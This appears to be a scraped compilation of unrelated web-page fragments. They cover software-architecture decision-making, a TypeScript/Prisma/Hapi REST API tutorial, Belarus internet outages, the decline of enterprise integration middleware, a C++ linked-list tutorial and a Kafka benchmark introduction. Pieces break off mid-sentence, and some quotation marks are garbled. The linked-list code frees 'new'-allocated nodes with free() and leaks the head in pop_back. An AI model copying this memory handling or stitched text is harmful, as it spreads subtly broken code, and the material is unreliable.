<p>As in the end the competitive advantage at deployment is not worth anything if your clients are not able to use your solutions, you will need to focus on providing the simplest possible solution from an operations point of view – which is a (deployment) monolith.</p>
<p>Additionally, a strict modularization concept at development time resulting in independent modules that are assembled together at build time could help you to realize parts of the competitive advantage that microservices would offer.</p>
<p>Again, while not complete these little examples should help to understand that one-size-fits-all solutions do not exist and the best option can vary heavily depending on the given context.</p>
<p>Architectural decisions are never â€œgoodâ€� or â€œbadâ€� per se, but only relative to a given context. Still, I see too many architectural discussions and recommendations being made in a vacuum, without taking the context into account.</p>
<h2 id="summing-up">Summing up</h2>
<p>These were my two “laws” of architectural work. Personally, I think it is essential to bear them in mind to be able to make good architectural work. Still, I see the opposite happening too often – at conferences, in articles, and also in actual project work, usually leading to bad decisions.</p>
<p>There would be a lot more to discuss in the context of the two laws, but I will leave it here. I hope I was able to bring the point across and would be glad if it contained some valuable ideas for you.</p>

The REST resources will map HTTP requests to the models in the Prisma schema, e.g. a <code>GET /users</code> endpoint will handle operations associated with the <code>User</code> model.</p><p>The next parts of this series will cover the other aspects from the list in detail.</p><blockquote><p><strong>Note:</strong> Throughout the guide you'll find various <strong>checkpoints</strong> that enable you to validate whether you performed the steps correctly.</p></blockquote><h3 id="prerequisites"><a href="#prerequisites" aria-label="prerequisites permalink"></a>Prerequisites</h3><h4 id="assumed-knowledge"><a href="#assumed-knowledge" aria-label="assumed knowledge permalink"></a>Assumed knowledge</h4><p>This series assumes basic knowledge of TypeScript, Node.js, and relational databases.

A set of rules that allow programs to talk to each other. Typically the developer creates the API on the server and allows clients to talk to it.</li><li><strong>REST:</strong> A set of conventions that developers follow to expose state-related (in this case state stored in the database) operations over HTTP requests. As an example, check out the <a target="_blank" rel="noopener noreferrer" href="https://docs.github.com/en/rest/overview/resources-in-the-rest-api">GitHub REST API</a>.</li><li><strong>Endpoint:</strong> Entry point to the REST API which has the following properties (non-exhaustive):<ul><li><strong>Path</strong>, e.g. <code>/users/</code>, which is used to access the users endpoint. The path determines the URL used to access the endpoint, e.g. <code>www.myapi.com/users/</code>.</li><li><strong>HTTP method</strong>, e.g. <code>GET</code>, <code>POST</code>, and <code>DELETE</code>. The HTTP method will determine the type of operation an endpoint exposes, for example the <code>GET /users</code> endpoint will allow fetching users and <code>POST /users</code> endpoint will allow creating users.</li><li><strong>Handler</strong>: The code (in this case TypeScript) which will handle requests for an endpoint.</li></ul></li><li><strong>HTTP status codes:</strong> The response HTTP status code will inform the API consumer whether the operation was successful and if any errors occurred. Check out <a target="_blank" rel="noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status">this list</a> for the different HTTP status codes, e.g. <code>201</code> when a resource was created successfully, and <code>400</code> when consumer input fails validation.</li></ul><blockquote><p><strong>Note:</strong> One of the key objectives of the REST approach is using HTTP as an application protocol to avoid reinventing the wheel by sticking to conventions.</p></blockquote><h4 id="the-api-endpoints"><a href="#the-api-endpoints" aria-label="the api endpoints permalink"></a>The API endpoints</h4><p>The API will have the following endpoints (HTTP method followed by path):</p><table><thead><tr><th>Resource</th><th>HTTP Method</th><th>Route</th><th>Description</th></tr></thead><tbody><tr><td><code>User</code></td><td><code>POST</code></td><td><code>/users</code></td><td>Create a user (and optionally associate with courses)</td></tr><tr><td><code>User</code></td><td><code>GET</code></td><td><code>/users/{userId}</code></td><td>Get a user</td></tr><tr><td><code>User</code></td><td><code>PUT</code></td><td><code>/users/{userId}</code></td><td>Update a user</td></tr><tr><td><code>User</code></td><td><code>DELETE</code></td><td><code>/users/{userId}</code></td><td>Delete a user</td></tr><tr><td><code>User</code></td><td><code>GET</code></td><td><code>/users</code></td><td>Get users</td></tr><tr><td><code>CourseEnrollment</code></td><td><code>GET</code></td><td><code>/users/{userId}/courses</code></td><td>Get a user's enrollement incourses</td></tr><tr><td><code>CourseEnrollment</code></td><td><code>POST</code></td><td><code>/users/{userId}/courses</code></td><td>Enroll a user to a course (as student or teacher)</td></tr><tr><td><code>CourseEnrollment</code></td><td><code>DELETE</code></td><td><code>/users/{userId}/courses/{courseId}</code></td><td>Delete a user's enrollment to a course</td></tr><tr><td><code>Course</code></td><td><code>POST</code></td><td><code>/courses</code></td><td>Create a course</td></tr><tr><td><code>Course</code></td><td><code>GET</code></td><td><code>/courses</code></td><td>Get courses</td></tr><tr><td><code>Course</code></td><td><code>GET</code></td><td><code>/courses/{courseId}</code></td><td>Get a course</td></tr><tr><td><code>Course</code></td><td><code>PUT</code></td><td><code>/courses/{courseId}</code></td><td>Update a course</td></tr><tr><td><code>Course</code></td><td><code>DELETE</code></td><td><code>/courses/{courseId}</code></td><td>Delete a course</td></tr><tr><td><code>Test</code></td><td><code>POST</code></td><td><code>/courses/{courseId}/tests</code></td><td>Create a test for a course</td></tr><tr><td><code>Test</code></td><td><code>GET</code></td><td><code>/courses/tests/{testId}</code></td><td>Get a test</td></tr><tr><td><code>Test</code></td><td><code>PUT</code></td><td><code>/courses/tests/{testId}</code></td><td>Update a test</td></tr><tr><td><code>Test</code></td><td><code>DELETE</code></td><td><code>/courses/tests/{testId}</code></td><td>Delete a test</td></tr><tr><td><code>Test Result</code></td><td><code>GET</code></td><td><code>/users/{userId}/test-results</code></td><td>Get a user's test results</td></tr><tr><td><code>Test Result</code></td><td><code>POST</code></td><td><code>/courses/tests/{testId}/test-results</code></td><td>Create test result for a test associated with a user</td></tr><tr><td><code>Test Result</code></td><td><code>GET</code></td><td><code>/courses/tests/{testId}/test-results</code></td><td>Get multiple test results for a test</td></tr><tr><td><code>Test Result</code></td><td><code>PUT</code></td><td><code>/courses/tests/test-results/{testResultId}</code></td><td>Update a test result (associated with a user and a test)</td></tr><tr><td><code>Test Result</code></td><td><code>DELETE</code></td><td><code>/courses/tests/test-results/{testResultId}</code></td><td>Delete a test result</td></tr></tbody></table><blockquote><p><strong>Note:</strong> The paths containing a parameter enclosed in <code>{}</code>, e.g. <code>{userId}</code> represent a variable that is interpolated in the URL, e.g. in <code>www.myapi.com/users/13</code> the <code>userId</code> is <code>13</code>.</p></blockquote><p>The endpoints above have been grouped based on the main model/resource they're associated with. The categorization will help with organizing the code into separate modules for maintainability.</p><p>In this article, you will implement a subset of the endpoints above (the first four) to illustrate the different patterns for different CRUD operations. The full API will be available in the <a target="_blank" rel="noopener noreferrer" href="https://github.com/2color/real-world-grading-app">GitHub repository</a>.
These endpoints should provide an interface for most operations. While some resources do not have a <code>DELETE</code> endpoint for deleting resources, they can be added later.</p><blockquote><p><strong>Note:</strong> Throughout the article, the words <em>endpoint</em> and <em>route</em> will be used interchangeably. While they refer to the same thing, <em>endpoint</em> is the term used in the context of REST, while <em>route</em> is the term used in the context of HTTP servers.</p></blockquote><h4 id="hapi"><a href="#hapi" aria-label="hapi permalink"></a>Hapi</h4><p>The API will be built with <a target="_blank" rel="noopener noreferrer" href="https://hapi.dev/">Hapi</a> – a Node.js framework for building HTTP servers that support validation and testing out of the box.</p><p>Hapi consists of a core module named <code>@hapi/hapi</code> which is the HTTP server and modules that extend the core functionality. In this backend you will also use the following:</p><ul><li><code>@hapi/joi</code> for declarative input validation</li><li><code>@hapi/boom</code> for HTTP-friendly error objects</li></ul><p>For Hapi to work with TypeScript, you will need to add the types for Hapi and Joi. This is necessary because Hapi is written in JavaScript. By adding the types, you will have rich auto-completion and allow the TypeScript compiler to ensure the type safety of your code.</p><p>Install the following packages:</p><pre><code>npm install <span>--</span>save @hapi<span>/</span>boom @hapi<span>/</span>hapi @hapi<span>/</span>joi

Prague-based <a href="https://blog.qrator.net/en/what-happening-BY_86/">Qrator Labs saw</a> the concurrent outage of 80% of IPv6 prefixes within Belarus, and inferred that filtering of downstream autonomous systems (AS) was taking place at the level of two upstream ASes that dominate international transit, AS6697 and AS60280. Official releases by the <a href="https://cert.by/?p=1722">National Center for Response to Computer Incidents</a>, the <a href="https://ncot.by/ru/news/news/o-vosstanovlenii-raboty-seti-internet/">National Traffic Exchange Center</a>, and <a href="https://beltelecom.by/news/main/vnimaniyu-abonentov-3">Beltelecom</a> stated the disruptions were the result of external cyberattacks and equipment failures.&nbsp;</span></span></p><p><span><span>Psiphon network performance and session quality remained at or above the regional average over the days of the shutdown.

        <p>How to publish a small file from a FTP location to a JMS queue? This was the problem statement given to me when I got my first job. As any new graduate would do, I thought of writing a fascinating, rocket science program using some programming language to get this done.</p>
<p>My new boss understood my blind enthusiasm and diverted me towards evaluating an enterprise integration product. In 2010, Open Source was just starting to boom in every technology layer of an enterprise, till then the biggest open source hit was Linux, then Android. For many, Open source was a new and scary concept.</p>
<p>I was particularly focusing on Open Source Integration Products, it was a new product category at that time. Some of today's popular enterprise integration vendors were laying their product and community foundation. Starting from Apache Camel with contributions from FuseSource(then acquired by RedHat) &amp; Talend, MuleSoft, WSO2, etc.</p>
<p>I played with pretty much all of these products and more, further I spent multiple years focusing on each of these products as I built my career around Enterprise Integration.</p>


<figure>

<figcaption>
<h4>Integration Vs Custom Programming</h4>
</figcaption>
</figure>

<p>BTW, I was able to solve the FTP -&gt; JMS integration problem by writing a few lines of configurations (not program, just configurations), It was super easy. But I was living in guilt, spending 4 years in engineering and writing a two line Apache Camel code to move the file from FTP to JMS. You know what I mean ! (Just google my name along with any of these products, you will see a lot of related questions to the community,  Ignore all things naive, I was too young come on)</p>

<ul>
<li><strong>The number of applications were growing:</strong> Yes, enterprises built a lot of applications, as their business grew.
All these applications needed to talk with each other: Yes, that's how businesses were able to bring more value to customers.</li>
<li><strong>Developers were writing too much code.</strong> Yes, especially a lot of Java code with a lot of classes, with bugs, leading to performance issues and longer development cycles. (Yes, you can write 10 classes + 50 methods + completely unreadable code for the same FTP -&gt; JMS use case. )</li>
<li><strong>Too many point to point integrations</strong>, Developers built on-demand direct integrations between Applications. This led architects losing context on what is being built and what is connected to what.</li>
<li><strong>Too many integration points</strong> = too many protocols to deal with. Concept of adapters/connectors were treated like rocket science those days and It was super costly to build one yourself.</li>
</ul>

<p>I should actually call it - ‘More awareness in Enterprises to use Integration Products’. Yes, this happened in 2010.</p>
<p>Multiple communities and product vendors came up with products under the category of ‘Enterprise Integration’, converging a lot of ideologies like SOA, ESB’s, Middleware, MQ’s, Web Services, API’s, etc.</p>
<p>This actually improved the overall enterprise architecture in a lot of ways:</p>


<blockquote>
<p><strong>“Nothing lasts forever"</strong></p>
</blockquote>
<p>Today, The scope of Enterprise Integration technologies has shrunk in the end to end solution architecture. Integration Middleware worked, there is no flaw in the way it got evolved over the past decade. Particularly, Integration products streamlined the overall enterprise architecture in a lot of ways, <strong>unfortunately it was over architected without addressing the fundamental flaws in the underlying technologies/platforms.</strong></p>


<figure>
<img src="https://gnana.io/image/enterprise-integration-flaw.png">
<figcaption>
<h4>Enterprise Integration - Flaw</h4>
</figcaption>
</figure>

<p>Enterprise Integration is a smart workaround to mitigate some of the technology immaturities around data storage, workarounds are meant for the short term and it doesn't last long.</p>
<p>Lets see why it was a workaround:</p>
<p><strong>Building dumb integration pipes:</strong> This was a rule of thumb given to any integration developer - ”Keep the integration pipelines as dumb as possible = No business rules = No complex transformations” This was etched on every integration developer, every pipeline was built on top of this fundamental philosophy. Why ?</p>
<ul>
<li><strong>In-memory limitations</strong> - All these integration platforms were built using traditional runtimes, Eg: Tomcat. These runtimes depend on the limited heap space provided within a VM/Machine. When you are processing 10 TPS(Transactions per second) on a 8 Gig machine, You don't have room for doing any computation on the data, the faster you send the data out, it's good for the runtime. If you add any business logic, Eg: any simple aggregate function (SUM, COUNT, etc), your runtime will start accumulating messages and it will blow into pieces.</li>
</ul>


<figure>
<img src="https://gnana.io/image/memory-constraint.png">
<figcaption>
<h4>Memory constraints</h4>
</figcaption>
</figure>

<ul>
<li><strong>Store First, Process Next</strong> - This is a golden philosophy in enterprise architecture isn't it, more than a philosophy its a habit. If you want to build a website, first design database tables, if you want to build a integration pipe, first figure out where you will store data, if you want to process data, first store it somewhere. In order to process data, we have to accumulate data first ! This is not just a habit, we got into this habit because of the previous limitation - We only relied on in-memory(RAM) capacity to handle data, we were able to build too many integrations, but we were never able to store the data in the pipe itself. Obviously you cant permanently store data in memory. All those million dollar pipes are dumb, you still need another multi-tier architecture to store your data.</li>
</ul>


<figure>
<img src="https://gnana.io/image/storage-habit.png">
<figcaption>
<h4>Loosing real-time advantage</h4>
</figcaption>
</figure>

<p>This really means, “Building dumb integration pipelines” or “Integration Pipelines without business rules” was just an approach to mitigate the underlying technology limitations. We clinged too much into building dumb pipes instead of trying to fix the under the hood infrastructure limitations.</p>
<blockquote>
<p>“Q: Hey come on, we deploy Integration Pipelines using Kubernetes, We can handle a lot of traffic."</p>
</blockquote>
<blockquote>
<p>"A: As the integration market matured, we also improved technologies around scalability. Kubernetes is one great example, It is still a great technology for a lot of use cases and it has a promising future. But for Enterprise Integration, Kubernetes is a horse blinker - Integration pipelines were predominantly stateless services, we were able to scale integration pipelines to handle more traffic, but we were never able to efficiently process data on the fly. (I am not saying Kubernetes is bad for stateful services, Enterprise Integration products narrowed too much into the philosophy of building dumb pipes, isolating themselves away from data processing patterns)”</p>
</blockquote>

<p>Lets see why Enterprise Integration cannot cope with business demands going forward</p>
<ul>
<li><strong>Value is in the pipeline:</strong> As more and more connected applications you have, you can't afford to use ‘data at rest’ approach to generate business value. With more applications connected and fast moving data, the opportunity window to process data is getting narrower. Which means, businesses cannot wait for the data to be accumulated first, in order to process them. Basically, businesses needs smarter pipes not the dumb ones. Smarter here refers to the ability to store and process data on the fly.</li>
</ul>


<figure>
<img src="https://gnana.io/image/data-flow-dumb.png">
<figcaption>
<h4>Dumb pipes</h4>
</figcaption>
</figure>

<ul>
<li><strong>Integration is tightly Coupled:</strong> When you build integration pipelines, you tightly couple your mapping transformations with source/destination protocol. This means, you can't scale above a threshold Eg: You may be able to scale your integration pipeline using 100 pods in Kubernetes, but if your destination REST API can't handle your volume, you are going to kill them.</li>
</ul>


<figure>
<img src="https://gnana.io/image/integration-pipeline.png">
<figcaption>
<h4>Typical integration pipeline</h4>
</figcaption>
</figure>

<ul>
<li><strong>Point to Point integration problems still exist:</strong> The whole promise of integration products was to avoid point to point integrationa, instead integration products created an envelope on top direct integrations. If we take a step back and look at all the integration flows we built, Its déjà vu: "the same point to point integrations inside a costly wrapper"</li>
</ul>


<figure>
<img src="https://gnana.io/image/enterprise-integration-before-and-after.png">
<figcaption>
<h4>Point to point integrations stay as is</h4>
</figcaption>
</figure>

<ul>
<li><strong>Incomplete Event Driven Architecture:</strong> Of course Integration was built on event driven principles, for eg: JMS queues, we built nice event driven pipelines using queues, but in the end didn't we forcefully kill those events by passively storing them somewhere ? (We will talk about batch processing in a separate blog)</li>
</ul>
<p>In summary, Middlewares/Integration products became quite critical in enterprises. Unfortunately, these products did not evolve as better as Enterprises evolved. Businesses are looking into data that is active, data that is on the move, to process a business event as and when it happens, generate value to a customer as fast as they can, but Integration products can't cope with this evolution.</p>

<p>Absolutely not. But their scope is reducing. Enterprise Integration products create a network of applications within enterprises, but an application network is an overkill when you cannot process the data within the network.</p>


<figure>

<h4>ESB vs ESP</h4>
</figcaption>
</figure>

<p>The only useful pattern that we all learnt from an integration product, is building reusable adapters/connectors. There will always be a diverse number of protocols, there will always be the need for protocol bridging/translations but there will not be a need for integration pipelines. Dumb pipes will diminish, “Processing data while its on the move” is what is helping enterprises today and dominate enterprise architecture in the future.</p>

<p>As the number of applications grow, they will generate more and more meaningful events, events around your customers, partners, business transactions, etc.</p>
<p>If you look at events as they are, they have life in them. They are generated at a particular time, based on a particular action.</p>
<p>If you build dumb pipes, they may survive for few seconds after they are born, but they will die as soon as it reaches the destination(storage)</p>
<p>All these streams of events are meant to be captured as it is, kept alive as they are, and process them whenever you need to, without flattening them to death.</p>
<p>To do this, you need a platform that can move data …</p></article></div></div></div>

<p>In the <a href="https://www.alphacodingskills.com/ds/linked-list.php">previous section</a>, we had discussed about structure of linked list. In this section, we will learn about basic operations of a linked list.</p>

<h2>Traverse a Linked List</h2>
<p>Traversing through a linked list is very easy. It requires creating a temp node pointing to the head of the list. If the temp node is not null, display its content and move to the next node using temp next. Repeat the process till the temp node becomes null. If the temp node is empty at the start, then the list contains no item.</p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Display the content of the list
void PrintList() {
  
  //1. create a temp node pointing to head
  Node* temp = head;
  
  //2. if the temp node is not null continue 
  //   displaying the content and move to the 
  //   next node till the temp becomes null
  if(temp != NULL) {
    cout&lt;&lt;"\nThe list contains: ";
    while(temp != NULL) {
      cout&lt;&lt;temp-&gt;data&lt;&lt;" ";
      temp = temp-&gt;next;
    }
  } else {
    
    //3. If the temp node is null at the start, 
    //   the list is empty
    cout&lt;&lt;"\nThe list is empty.";
  }
} 
</pre>
</div>

<br>
<h2>Insert a new node in Linked List</h2>
<p>A new node can be inserted into a list in three ways:</p>
<ul>
  <li>Insert a node at the start</li>
  <li>Insert a node at the given position</li>
  <li>Insert a node at the end</li>
</ul>
<h3>Insert a new node at the start</h3>
<p>In this method, a new node is inserted at the beginning of the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at the start, the list becomes 100-&gt;10-&gt;20-&gt;30.</p>

<p>Inserting a new node at the beginning of the Linked List is very easy. First, a new node with given element is created. It is then added before the head of the given list that makes the newly added node to new head of the list by changing the head pointer to point to the new node.  </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   --> 
<pre>//C++ Code
//Inserts a new node at the start 
void push_front(int newElement) {
  
  //1. allocate a new node
  Node* newNode = new Node();
  
  //2. assign data element 
  newNode-&gt;data = newElement;
  
  //3. make next node of new node as head
  newNode-&gt;next = head;
  
  //4. make new node as head 
  head = newNode;   
}
</pre>
</div>


<br>
<h3>Insert a new node at the given position</h3>
<p>In this method, a new element is inserted at the specified position in the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at position 2, the list becomes 10-&gt;100-&gt;20-&gt;30.</p>
<p>First, a new node with given element is created. If the insert position is 1, then the new node is made to head. Otherwise, traverse to the node that is previous to the insert position and check if it is null or not. In case of null, the specified position does not exist. In other case, assign next of the new node as next of the previous node and next of previous node as new node.</p>


<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Inserts a new node at the given position
void push_at(int newElement, int position) {
  
  //1. allocate node to new element
  Node* newNode = new Node(); 
  newNode-&gt;data = newElement;
  newNode-&gt;next = NULL;

  //2. check if the position is &gt; 0
  if(position &lt; 1) {
    cout&lt;&lt;"\nposition should be &gt;= 1.";
  } else if (position == 1) {
  
  //3. if the position is 1, make next of the
  //   new node as head and new node as head
    newNode-&gt;next = head;
    head = newNode;
  } else {

   //4. Else, make a temp node and traverse to the 
   //   node previous to the position
    Node* temp = head;
    for(int i = 1; i &lt; position-1; i++) {
      if(temp != NULL) {
        temp = temp-&gt;next;
      }
    }
 
    //5. If the previous node is not null, make 
    //   newNode next as temp next and temp next 
    //   as newNode.
    if(temp != NULL) {
      newNode-&gt;next = temp-&gt;next;
      temp-&gt;next = newNode;  
    } else {
      
      //6. When the previous node is null
      cout&lt;&lt;"\nThe previous node is null.";
    } 
  }
}
</pre>
</div>

<br>
<h3>Insert a new node at the end</h3>
<p>In this method, a new node is inserted at the end of the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at the end, the list becomes 10-&gt;20-&gt;30-&gt;100. </p>

<p>Inserting a new node at the end of the Linked List is very easy. First, a new node with given element is created. It is then added at the end of the list by linking the last node to the new node. </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Inserts a new node at the end
void push_back(int newElement) {
  
  //1. allocate node
  Node* newNode = new Node();
  
  //2. assign data element
  newNode-&gt;data = newElement;
  
  //3. assign null to the next of new node
  newNode-&gt;next = NULL; 
  
  //4. Check the list is empty or not,
  //   if empty make the new node as head 
  if(head == NULL) {
    head = newNode;
  } else {
    
    //5. Else, traverse to the last node
    Node* temp = head;
    while(temp-&gt;next != NULL)
      temp = temp-&gt;next;
    
    //6. Change the next of last node to new node
    temp-&gt;next = newNode;
  }    
}
</pre>
</div>

<br>
<h2>Delete a Node from Linked List</h2>
<p>A node can be deleted from a list in three ways:</p>
<ul>
  <li>Delete the first node</li>
  <li>Delete the node at given position</li>
  <li>Delete the last node</li>
</ul>
<h3>Delete the first node</h3>
<p>In this method, the first node of the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30-&gt;40 and the first node is deleted, the list becomes 20-&gt;30-&gt;40.</p>

<p>Deleting the first node of the linked list is very easy. If the head is not null then create a temp node pointing to head and move head to the next of head. Then delete the temp node. </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->     
<pre>//C++ Code
//Deletes the first node
void pop_front() {
  if(head != NULL) {
    
    //1. if head is not null, create a
    //   temp node pointing to head
    Node* temp = head;

    //2. move head to next of head
    head = head-&gt;next; 

    //3. delete temp node
    free(temp); 
  }
}
</pre>
</div>

<br>
<h3>Delete a node from middle</h3>
<p>In this method, a node at the specified position in the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30 and the 2<sup>nd</sup> node is deleted, the list becomes 10-&gt;20.</p>
<p>First, the specified position must be greater than equal to 1. If the specified position is 1 and head is not null, then make the head to head next. Else, traverse to the node that is previous to the specified position. If the specified node and previous to the specified node are not null then adjust the link and delete the node at specified position. In other case, the specified node will be already null.</p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Deletes the node at given position
void pop_at(int position) {     
  
  //1. check if the position is &gt; 0
  if(position &lt; 1) {
    cout&lt;&lt;"\nposition should be &gt;= 1.";
  } else if (position == 1 &amp;&amp; head != NULL) {
      
    //2. if the position is 1 and head is not null,
    //   make head to head next and delete the 
    //   previous head
    Node* nodeToDelete = head;
    head = head-&gt;next;
    free(nodeToDelete);
  } else {
    
    //3. Else, make a temp node and traverse to the 
    //   node previous to the position
    Node* temp = head;
    for(int i = 1; i &lt; position-1; i++) {
      if(temp != NULL) {
        temp = temp-&gt;next;
      }
    }
 
    //4. If the previous node and next of the previous  
    //   is not null, adjust links 
    if(temp != NULL &amp;&amp; temp-&gt;next != NULL) {
        Node* nodeToDelete = temp-&gt;next;
        temp-&gt;next = temp-&gt;next-&gt;next;
        free(nodeToDelete); 
    } else {

      //5. Else the given node will be empty.
      cout&lt;&lt;"\nThe node is already null.";
    }       
  }
} 
</pre>
</div>

<br>
<h3>Delete the last node</h3>
<p>In this method, the last node of the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30-&gt;40 and the last node is deleted, the list becomes 10-&gt;20-&gt;30.</p>
<p>Deleting the last node of the Linked List involves checking the head for empty. If it is not empty, then check the head next for empty. If the head next is empty, then release the head, else traverse to the second last node of the list. Then, link the next of second last node to NULL and delete the last node.  </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->  
<pre>//C++ Code
//Deletes the last node
void pop_back() {
  if(head != NULL) {
    
    //1. if head in not null and next of head
    //   is null, release the head
    if(head-&gt;next == NULL) {
      head = NULL;
    } else {
      
      //2. Else, traverse to the second last 
      //   element of the list
      Node* temp = head;
      while(temp-&gt;next-&gt;next != NULL)
        temp = temp-&gt;next;
      
      //3. Change the next of the second 
      //   last node to null and delete the
      //   last node
      Node* lastNode = temp-&gt;next;
      temp-&gt;next = NULL; 
      free(lastNode);
    }
  }
}
</pre>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Apache Kafka<sup>®</sup> is one of the most popular event streaming systems. There are many ways to <a href="https://www.confluent.io/kafka-vs-pulsar/">compare systems</a> in this space, but one thing everyone cares about is performance. Kafka has been known to be <a href="https://engineering.linkedin.com/kafka/benchmarking-apache-kafka-2-million-writes-second-three-cheap-machines" target="_blank" rel="noopener noreferrer">fast</a>, but how fast is it today, and how does it stack up against other systems? We decided to test Kafka’s performance on the latest cloud hardware to find out.</p>
<p>For comparisons, we chose a traditional message broker, <a href="https://www.rabbitmq.com/" target="_blank" rel="noopener noreferrer">RabbitMQ</a>, and one of the <a href="https://bookkeeper.apache.org/" target="_blank" rel="noopener noreferrer">Apache BookKeeper™</a>&nbsp;based message brokers, <a href="http://pulsar.apache.org/" target="_blank" rel="noopener noreferrer">Apache Pulsar</a>. We focused on (1) <strong>system throughput</strong> and (2) <strong>system latency</strong>, as these are the primary performance metrics for event streaming systems in production. In particular, the throughput test measures how efficient each system is in utilizing the hardware, specifically the disks and the CPU. The latency test measures how close each system is to delivering real-time messaging including tail latencies of up to p99.9th percentile, a key requirement for real-time and mission-critical applications as well as microservices architectures.</p>
<p>We found that Kafka delivers the best throughput while providing the lowest end-to-end latencies up to the p99.9th percentile. At lower throughputs, RabbitMQ delivers messages at very low latencies.</p>

<p><em>*RabbitMQ latencies degrade significantly at throughputs higher than the 30 MB/s. Furthermore, the impact of mirroring is significant at higher throughput and better latencies can be achieved by using just classic queues without mirroring.</em></p>
<p>This blog post is structured to first walk you through the benchmarking framework we used, followed by a description of the testbed and the workloads. It will finish with an explanation of the results using the various system and application metrics. All of these are <a href="https://github.com/confluentinc/openmessaging-benchmark/" target="_blank" rel="noopener noreferrer">open source</a>, so curious readers can reproduce the results for themselves or dig deeper into the collected Prometheus metrics. As with most benchmarks, we compare performance on a setup for a specific workload. We always encourage readers to compare using their own workloads/setups, to understand how these translate to production deployments. For a deeper look at features, architecture, ecosystem, and more, read this <a href="https://www.confluent.io/kafka-vs-pulsar/">complete guide</a> comparing Kafka, Pulsar, and RabbitMQ.</p>

<h2 id="background"><a id="background"></a>Background</h2>
<p>First, let’s discuss each of the systems briefly to understand their high-level design and architecture, looking at the trade-offs each system makes.</p>
<p><strong>Kafka</strong> is an open-source distributed event streaming platform, and one of the five most active projects of the Apache Software Foundation. At its core, Kafka is designed as a replicated, distributed, persistent commit log that is used to power event-driven microservices or large-scale stream processing applications. Clients produce or consume events directly to/from a cluster of brokers, which read/write events durably to the underlying file system and also automatically replicate the events synchronously or asynchronously within the cluster for fault tolerance and high availability.</p>
<p><strong>Pulsar</strong> is an open-source distributed pub/sub messaging system originally catered towards queuing use cases. It recently added event streaming functionality as well. Pulsar is designed as a tier of (almost) stateless broker instances that connect to a separate tier of BookKeeper instances, which actually read/write and, optionally, store/replicate the messages durably. Pulsar is not the only system of its kind as there are also other messaging systems like Apache DistributedLog and Pravega, which have been created on top of BookKeeper and aim to also provide some Kafka-like event streaming functionality.</p>
<p><strong>BookKeeper</strong> is an open-source distributed storage service that was originally designed as a write-ahead log for Apache™ Hadoop®’s NameNode. It provides persistent storage of messages in <em>ledgers</em>, across server instances called <em>bookies</em>. Each bookie synchronously writes each message to a local journal log for recovery purposes and then asynchronously into its local indexed ledger storage. Unlike Kafka brokers, bookies do not communicate with each other and it’s the BookKeeper clients that are responsible for replicating the messages across bookies using a quorum-style protocol.</p>
<p><strong>RabbitMQ</strong> is an open-source traditional messaging middleware that implements the AMQP messaging standard, catering to low-latency queuing use cases. RabbitMQ consists of a set of broker processes that host “exchanges” for publishing messages to and queues for consuming messages from. Availability and durability are properties of the various queue types offered. Classic queues offer the least availability guarantees. Classic mirrored queues replicate messages to other brokers and improve availability. Stronger durability is provided through the more recently introduced <a href="https://www.rabbitmq.com/quorum-queues.html" target="_blank" rel="noopener noreferrer">quorum queues</a> but at the <a href="https://www.rabbitmq.com/quorum-queues.html#use-cases" target="_blank" rel="noopener noreferrer">cost of performance</a>. Since this is a performance-oriented blog post, we restricted our evaluation to classic and mirrored queues.</p>
<h2 id="durability"><a id="durability"></a>Durability in distributed systems</h2>
<p>Single-node storage systems (e.g., RDBMS) depend on fsyncing writes to disk to ensure maximal durability. But in distributed systems, durability typically comes from replication, with multiple copies of the data that fail independently. Fsyncing data is just a way of reducing the impact of the failure when it does occur (e.g., fsyncing more often could lead to lower recovery time). Conversely, if enough replicas fail, a distributed system may be unusable regardless of fsync or not. Hence, whether we fsync or not is just a matter of what guarantees each system chooses to depend on for its replication design. While some depend closely on never losing data written to disk, thus requiring fsync on every write, others handle this scenario in their design.</p>
<p>Kafka’s replication protocol was carefully designed to ensure consistency and durability guarantees without the need for synchronous fsync by tracking what has been fsynced to the disk and what hasn’t. By assuming less, Kafka can handle a wider range of failures like filesystem-level corruptions or accidental disk de-provisioning and does not take for granted the correctness of data that is not known to be fsync’d. Kafka is also able to leverage the OS for batching writes to the disk for better performance.</p>
<p>We have not been able to ascertain categorically whether BookKeeper offers the same consistency guarantees without fsyncing each write—specifically, whether it can rely on replication for fault tolerance in the absence of synchronous disk persistence. This isn’t covered in the documentation or a write-up on the underlying replication algorithm. Based on our inspection and the fact that BookKeeper implements a grouped fsync algorithm, we believe it does rely on fsyncing on each write for its correctness, but we’d love to <a href="mailto:info@confluent.io" target="_blank" rel="noopener noreferrer">hear from folks</a> in the community who might know better if our conclusion is correct.</p>
<p>In any case, since this can be somewhat of a controversial topic, we’ve given results in both cases to ensure we are being as fair and complete as possible, though running Kafka with synchronous fsync is extremely uncommon and also unnecessary.</p>
<h2 id="benchmarking-framework"><a id="benchmarking-framework"></a>Benchmarking framework</h2>
